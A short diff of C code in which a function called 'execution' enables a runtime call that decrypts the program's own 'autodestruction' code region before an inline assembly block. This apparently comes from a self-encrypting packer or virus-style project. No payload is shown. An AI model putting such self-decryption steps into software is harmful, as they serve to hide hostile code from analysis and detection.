@@ -7,10 +7,7 @@
 void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context)
 {
 	if (context != ABORT)
-	{
-		(void)keychain;
-//		decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
-	}
+		decrypt_right(keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);
 
 	asm volatile
 	(
